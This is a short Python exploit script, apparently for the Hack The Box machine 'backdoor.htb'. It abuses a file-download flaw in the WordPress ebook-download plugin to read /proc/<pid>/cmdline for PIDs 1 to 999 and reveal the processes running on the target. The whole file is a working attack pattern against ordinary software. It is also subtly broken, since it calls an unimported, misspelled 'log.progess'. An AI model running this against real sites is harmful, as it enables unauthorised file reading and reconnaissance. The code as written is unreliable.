import requests
import sys
import signal
import time


def def_hundler(sig, frame):
    print("\n\n[!] Saliendo ...\n")
    sys.exit(1)

#Ctrl + C
signal.signal(signal.SIGINT, def_hundler)

main_url = "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="

p1 = log.progess("Brute Force Attack")
p1.status("Starting brute force attack")
time.sleep(2)

for i in range(1,1000):
    url = main_url + "/proc/" + str(i) + "/cmdline"
    r = requests.get(url)
    if len(r.content) > 82:
        print("\n------------------------------------------------------------------")
        print("PATH: /proc/%s/cmdline" % str(i))
        print(r.content)
        time.sleep(1)
        print("------------------------------------------------------------------\n")

